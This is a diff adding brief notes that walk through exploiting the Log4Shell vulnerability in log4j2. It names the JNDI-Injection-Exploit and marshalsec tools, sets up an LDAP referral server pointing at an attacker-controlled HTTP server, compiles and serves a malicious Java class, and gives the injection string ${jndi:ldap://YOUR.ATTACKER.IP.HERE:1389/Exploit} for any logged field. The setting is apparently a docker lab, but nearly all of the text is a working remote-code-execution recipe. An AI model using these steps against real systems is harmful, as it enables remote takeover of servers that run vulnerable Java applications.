@@ -1,0 +1,25 @@
+get the JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar from github. (you need the already compiled one otherwise it will fail)
+
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'Your command'
+
+use the rmi one based on having spring boot in the path
+
+test  that it works by doing docker exec
+
+otherwise do:
+
+in the marshalsec dir
+
+mvn clean package -DskipTests
+
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://your.attacker.ip.addr:8000/#Exploit"
+
+then write a malicious java class with code you want to execute. You must then compile this code with jdk 1.8.0_181 for best results
+
+javac Exploit.java -source 8 -target 8
+
+python3 -m http.server in the same directory as the exploit class
+
+to get the target to execute code type in any field logged by log4j2:
+
+${jndi:ldap://YOUR.ATTACKER.IP.HERE:1389/Exploit}
